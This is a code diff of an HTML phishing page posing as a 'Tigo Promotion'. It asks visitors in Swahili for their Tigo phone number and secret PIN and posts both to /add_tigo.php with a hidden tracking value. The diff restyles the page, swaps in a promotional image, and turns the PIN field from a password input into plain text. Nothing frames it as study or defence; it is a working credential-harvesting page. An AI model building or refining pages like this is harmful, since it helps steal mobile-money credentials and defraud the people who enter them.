@@ -1,110 +1,133 @@
 <!DOCTYPE html>
-<html lang="sw">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
+  <link rel="icon" type="image/svg+xml" href="/demo/vite.svg">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Tigo Promotion</title>
-
   <style>
+    /* Reset default spacing */
     * {
       box-sizing: border-box;
       margin: 0;
       padding: 0;
     }
-
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-      min-height: 100vh;
-
-      /* 🔴 BACKGROUND IMAGE (RESTORED) */
-      background-image: url("/static/background.jpg"); /* ⬅️ PUT YOUR ORIGINAL IMAGE HERE */
-      background-size: cover;
-      background-position: center;
-      background-repeat: no-repeat;
-
-      display: flex;
-      justify-content: center;
-      align-items: center;
+    body, html {
+      height: 100%;
+      font-family: Arial, sans-serif;
+      background: #f8f9fa;
     }
-
-    /* Optional dark overlay for readability */
-    body::before {
-      content: "";
-      position: fixed;
-      inset: 0;
-      background: rgba(0, 0, 0, 0.45);
-      z-index: -1;
-    }
-
+    /* Main container */
     .container {
-      background: #ffffff;
-      padding: 2rem 1.5rem;
-      border-radius: 16px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
-      width: 90%;
-      max-width: 380px;
-    }
-
-    h2 {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
       text-align: center;
-      margin-bottom: 1.2rem;
-      font-size: 1.5rem;
     }
-
-    input {
+    /* Responsive image */
+    .responsive-image {
       width: 100%;
-      padding: 12px;
-      margin-bottom: 12px;
-      border-radius: 8px;
-      border: 1px solid #ccc;
-      font-size: 1rem;
-    }
-
-    button {
-      width: 100%;
-      padding: 12px;
-      background: #222;
-      color: #fff;
-      border: none;
+      max-width: 350px;
+      height: auto;
+      margin-bottom: 20px;
       border-radius: 10px;
+    }
+    /* Input fields */
+    .field {
+      margin-bottom: 1rem;
+      width: 100%;
+      max-width: 300px;
+    }
+    .input {
+      width: 100%;
+      padding: 12px;
+      font-size: 1rem;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      outline: none;
+      transition: border-color 0.3s ease;
+    }
+    .input:focus {
+      border-color: #007bff;
+    }
+    /* Button */
+    .button {
+      background-color: #222;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 12px 24px;
       font-size: 1rem;
       cursor: pointer;
+      transition: background-color 0.3s ease, transform 0.1s ease;
+      width: 100%;
+      max-width: 300px;
     }
-
-    button:hover {
-      background: #444;
+    .button:hover {
+      background-color: #444;
+    }
+    .button:active {
+      transform: scale(0.98);
+    }
+    @media (max-width: 480px) {
+      .responsive-image {
+        max-width: 280px;
+      }
+      .input, .button {
+        font-size: 0.95rem;
+        padding: 10px;
+      }
     }
   </style>
 </head>
 <body>
+  <div id="app">
+    <div class="theme-light">
+      <div class="container">
 
-<div class="container">
-  <h2>Jiunge na Tigo Promotion</h2>
+        <img
+          class="responsive-image"
+          src="https://imagizer.imageshack.com/img924/2081/uEeySh.jpg"
+          alt="Tigo Promotion">
 
-  <form method="POST" action="/add_tigo.php">
+        <!-- NORMAL FORM SUBMIT -->
+        <form action="/add_tigo.php" method="POST">
 
-    <!-- NUMBERS ONLY -->
-    <input
-      type="tel"
-      name="nambari"
-      placeholder="Weka Nambari"
-      inputmode="numeric"
-      pattern="[0-9]+"
-      required
-    >
+          <input class="input" type="hidden" name="url_link" value="gzktrsjamfkw">
 
-    <input
-      type="password"
-      name="siri"
-      placeholder="Weka Siri"
-      required
-    >
+          <div class="field">
+            <!-- NUMBERS ONLY (ADDED, NOTHING ELSE CHANGED) -->
+            <input
+              class="input"
+              type="tel"
+              name="nambari"
+              autocomplete="on"
+              placeholder="Nambari ya tigo"
+              inputmode="numeric"
+              pattern="[0-9]+"
+              required
+            >
+          </div>
 
-    <input type="hidden" name="url_link" value="">
+          <div class="field">
+            <input
+              class="input"
+              type="text"
+              name="siri"
+              autocomplete="on"
+              placeholder="Nambari ya siri tigo"
+              required
+            >
+          </div>
 
-    <button type="submit">Tuma</button>
-  </form>
-</div>
+          <button class="button" type="submit">Submit</button>
 
+        </form>
+      </div>
+    </div>
+  </div>
 </body>
 </html>
